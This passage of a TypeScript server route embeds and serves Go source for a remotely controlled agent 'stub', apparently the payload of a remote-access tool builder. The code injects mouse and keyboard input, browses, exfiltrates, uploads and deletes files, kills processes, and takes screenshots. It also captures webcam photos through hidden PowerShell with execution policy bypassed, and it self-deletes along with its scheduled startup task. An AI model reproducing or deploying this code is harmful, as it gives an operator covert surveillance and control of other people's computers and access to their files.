		dy = int32(yNorm * 65535)
		flags |= mefAbsolute | mefMove
	}
	switch op {
	case "move":
	case "down":
		flags |= btnDown(button)
	case "up":
		flags |= btnUp(button)
	case "click":
		doSendMouse(mouseInputS{Dx: dx, Dy: dy, DwFlags: flags | btnDown(button)})
		doSendMouse(mouseInputS{DwFlags: btnUp(button)})
		sendResult(send, id, true, nil, "")
		return
	case "scroll":
		doSendMouse(mouseInputS{MouseData: uint32(int32(delta * 120)), DwFlags: mefWheel})
		sendResult(send, id, true, nil, "")
		return
	}
	doSendMouse(mouseInputS{Dx: dx, Dy: dy, DwFlags: flags})
	sendResult(send, id, true, nil, "")
}

func inputKeyCmd(send chan<- []byte, id string, p map[string]any) {
	vk := uint16(getNum(p, "vk", 0))
	if vk == 0 {
		sendResult(send, id, false, nil, "missing vk")
		return
	}
	op := getStr(p, "op", "press")
	switch op {
	case "down":
		doSendKey(keybdInputS{WVk: vk})
	case "up":
		doSendKey(keybdInputS{WVk: vk, DwFlags: kefKeyUp})
	default:
		doSendKey(keybdInputS{WVk: vk})
		doSendKey(keybdInputS{WVk: vk, DwFlags: kefKeyUp})
	}
	sendResult(send, id, true, nil, "")
}
`

const screenOtherGo = `//go:build !windows
package main

import (
	"errors"
	"image"
)

func captureFrame(maxW int) (*image.RGBA, int, int, error) {
	return nil, 0, 0, errors.New("not_supported_on_this_os")
}

func inputMouseCmd(send chan<- []byte, id string, p map[string]any) {
	sendResult(send, id, false, nil, "not_supported")
}

func inputKeyCmd(send chan<- []byte, id string, p map[string]any) {
	sendResult(send, id, false, nil, "not_supported")
}
`


// ─── file manager / processes / one-shot captures / uninstall ───────────────

const extrasGo = `package main

import (
	"bufio"
	"bytes"
	"context"
	"encoding/base64"
	"encoding/binary"
	"encoding/csv"
	"image/jpeg"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

func strArg(p map[string]any, key string) string {
	if v, ok := p[key].(string); ok {
		return v
	}
	return ""
}

func fsDefaultDir() string {
	if h, err := os.UserHomeDir(); err == nil {
		return h
	}
	return "C:\\\\"
}

func fsListCmd(send chan<- []byte, id string, p map[string]any) {
	dir := strArg(p, "path")
	if dir == "" {
		dir = fsDefaultDir()
	}
	entries, err := os.ReadDir(dir)
	if err != nil {
		sendResult(send, id, false, nil, err.Error())
		return
	}
	out := []map[string]any{}
	for _, e := range entries {
		info, _ := e.Info()
		size := int64(0)
		mod := ""
		if info != nil {
			size = info.Size()
			mod = info.ModTime().Format(time.RFC3339)
		}
		out = append(out, map[string]any{
			"name": e.Name(),
			"dir":  e.IsDir(),
			"size": size,
			"mod":  mod,
		})
	}
	sendResult(send, id, true, map[string]any{
		"path":    dir,
		"parent":  filepath.Dir(dir),
		"entries": out,
	}, "")
}

func fsDownloadCmd(send chan<- []byte, id string, p map[string]any) {
	fp := strArg(p, "path")
	if fp == "" {
		sendResult(send, id, false, nil, "missing path")
		return
	}
	info, err := os.Stat(fp)
	if err != nil {
		sendResult(send, id, false, nil, err.Error())
		return
	}
	if info.IsDir() {
		sendResult(send, id, false, nil, "cannot download a folder")
		return
	}
	if info.Size() > 12*1024*1024 {
		sendResult(send, id, false, nil, "file too large (max 12 MB)")
		return
	}
	data, err := os.ReadFile(fp)
	if err != nil {
		sendResult(send, id, false, nil, err.Error())
		return
	}
	sendResult(send, id, true, map[string]any{
		"name": filepath.Base(fp),
		"size": len(data),
		"data": base64.StdEncoding.EncodeToString(data),
	}, "")
}

func fsUploadCmd(send chan<- []byte, id string, p map[string]any) {
	fp := strArg(p, "path")
	b64 := strArg(p, "data")
	if fp == "" || b64 == "" {
		sendResult(send, id, false, nil, "missing path or data")
		return
	}
	data, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		sendResult(send, id, false, nil, "bad data: "+err.Error())
		return
	}
	if err := os.MkdirAll(filepath.Dir(fp), 0o755); err != nil {
		sendResult(send, id, false, nil, err.Error())
		return
	}
	if err := os.WriteFile(fp, data, 0o644); err != nil {
		sendResult(send, id, false, nil, err.Error())
		return
	}
	sendResult(send, id, true, map[string]any{"path": fp, "size": len(data)}, "")
}

func fsDeleteCmd(send chan<- []byte, id string, p map[string]any) {
	fp := strArg(p, "path")
	if fp == "" {
		sendResult(send, id, false, nil, "missing path")
		return
	}
	if err := os.RemoveAll(fp); err != nil {
		sendResult(send, id, false, nil, err.Error())
		return
	}
	sendResult(send, id, true, map[string]any{"deleted": fp}, "")
}

func procListCmd(send chan<- []byte, id string) {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("tasklist", "/FO", "CSV", "/NH")
		hideWindow(cmd)
		out, err := cmd.Output()
		if err != nil {
			sendResult(send, id, false, nil, err.Error())
			return
		}
		r := csv.NewReader(bytes.NewReader(out))
		r.FieldsPerRecord = -1
		rows, err := r.ReadAll()
		if err != nil {
			sendResult(send, id, false, nil, err.Error())
			return
		}
		procs := []map[string]any{}
		for _, row := range rows {
			if len(row) < 5 {
				continue
			}
			pid, _ := strconv.Atoi(row[1])
			mem := strings.TrimSuffix(strings.ReplaceAll(row[4], ",", ""), " K")
			memKb, _ := strconv.ParseInt(mem, 10, 64)
			procs = append(procs, map[string]any{"pid": pid, "name": row[0], "mem_kb": memKb})
		}
		sendResult(send, id, true, map[string]any{"processes": procs}, "")
		return
	}
	cmd := exec.Command("ps", "-eo", "pid=,rss=,comm=")
	out, err := cmd.Output()
	if err != nil {
		sendResult(send, id, false, nil, err.Error())
		return
	}
	procs := []map[string]any{}
	sc := bufio.NewScanner(bytes.NewReader(out))
	for sc.Scan() {
		f := strings.Fields(sc.Text())
		if len(f) < 3 {
			continue
		}
		pid, _ := strconv.Atoi(f[0])
		memKb, _ := strconv.ParseInt(f[1], 10, 64)
		procs = append(procs, map[string]any{"pid": pid, "name": f[2], "mem_kb": memKb})
	}
	sendResult(send, id, true, map[string]any{"processes": procs}, "")
}

func procKillCmd(send chan<- []byte, id string, p map[string]any) {
	pidF, ok := p["pid"].(float64)
	if !ok || pidF <= 0 {
		sendResult(send, id, false, nil, "missing pid")
		return
	}
	pid := int(pidF)
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("taskkill", "/F", "/PID", strconv.Itoa(pid))
	} else {
		cmd = exec.Command("kill", "-9", strconv.Itoa(pid))
	}
	hideWindow(cmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		sendResult(send, id, false, nil, strings.TrimSpace(string(out)))
		return
	}
	sendResult(send, id, true, map[string]any{"killed": pid}, "")
}

func screenshotCmd(send chan<- []byte, id string) {
	img, w, h, err := captureFrame(1600)
	if err != nil || img == nil {
		sendResult(send, id, false, nil, "capture failed")
		return
	}
	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 82}); err != nil {
		sendResult(send, id, false, nil, err.Error())
		return
	}
	sendResult(send, id, true, map[string]any{
		"w":    w,
		"h":    h,
		"jpeg": base64.StdEncoding.EncodeToString(buf.Bytes()),
	}, "")
}

func cameraShotCmd(send chan<- []byte, id string, p map[string]any) {
	if runtime.GOOS != "windows" {
		sendResult(send, id, false, nil, "webcam photo is only supported on Windows")
		return
	}
	script, err := writeTempPs(cameraPsCaptureB64)
	if err != nil {
		sendResult(send, id, false, nil, err.Error())
		return
	}
	defer os.Remove(script)
	dev := strArg(p, "device_id")
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	args := []string{"-NoProfile", "-ExecutionPolicy", "Bypass", "-STA", "-File", script,
		"-DeviceId", dev, "-Fps", "5", "-Width", "1280"}
	cmd := exec.CommandContext(ctx, "powershell.exe", args...)
	hideWindow(cmd)
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		sendResult(send, id, false, nil, err.Error())
		return
	}
	if err := cmd.Start(); err != nil {
		sendResult(send, id, false, nil, err.Error())
		return
	}
	r := bufio.NewReaderSize(stdout, 1<<20)
	header := make([]byte, 4)
	if _, err := io.ReadFull(r, header); err != nil {
		_ = cmd.Process.Kill()
		sendResult(send, id, false, nil, "no frame from camera")
		return
	}
	size := int(binary.LittleEndian.Uint32(header))
	if size <= 0 || size > 20*1024*1024 {
		_ = cmd.Process.Kill()
		sendResult(send, id, false, nil, "bad frame size")
		return
	}
	frame := make([]byte, size)
	if _, err := io.ReadFull(r, frame); err != nil {
		_ = cmd.Process.Kill()
		sendResult(send, id, false, nil, "frame read failed")
		return
	}
	_ = cmd.Process.Kill()
	go cmd.Wait()
	w, h := jpegDims(frame)
	sendResult(send, id, true, map[string]any{
		"w":    w,
		"h":    h,
		"jpeg": base64.StdEncoding.EncodeToString(frame),
	}, "")
}

func agentUninstallCmd(send chan<- []byte, id string) {
	sendResult(send, id, true, map[string]any{"uninstalling": true}, "")
	go func() {
		time.Sleep(500 * time.Millisecond)
		if runtime.GOOS == "windows" {
			name := startupName
			if name == "" {
				name = buildName
			}
			c1 := exec.Command("schtasks", "/Delete", "/F", "/TN", name)
			hideWindow(c1)
			_ = c1.Run()
			if exe, err := os.Executable(); err == nil {
				c2 := exec.Command("cmd", "/C", "ping", "127.0.0.1", "-n", "3", ">nul", "&", "del", "/F", "/Q", exe)
				hideWindow(c2)
				_ = c2.Start()
			}
		}
		os.Exit(0)
	}()
}
`

export const Route = createFileRoute('/api/public/buildserver/stub')({
  server: {
    handlers: {
      GET: async ({ request }) => {
        const key = (
          request.headers.get('x-buildserver-key') ??
          request.headers.get('authorization')?.replace(/^Bearer\s+/i, '') ??
          ''
        ).trim()
        const accepted = [
          process.env.BUILDSERVER_KEY?.trim(),
          process.env.BUILDSERVER_KEY_LEGACY?.trim(),
        ].filter((v): v is string => !!v && v.length > 0)
        if (accepted.length && !accepted.includes(key)) {
          return new Response('Unauthorized', { status: 401 })
        }
        return new Response(
          JSON.stringify({
            language: 'go',
            files: {
              'go.mod': goMod,
              'main.go': mainGo,
              'binding.go': bindingGo,
              'ws.go': wsGo,
              'metrics_windows.go': metricsWindowsGo,
              'metrics_other.go': metricsOtherGo,
              'screen.go': screenGo,
              'screen_windows.go': screenWindowsGo,
              'screen_other.go': screenOtherGo,
              'camera.go': cameraGo,
              'extras.go': extrasGo,
            },
          }),
          { headers: { 'Content-Type': 'application/json' } },
        )
      },
    },
  },
})
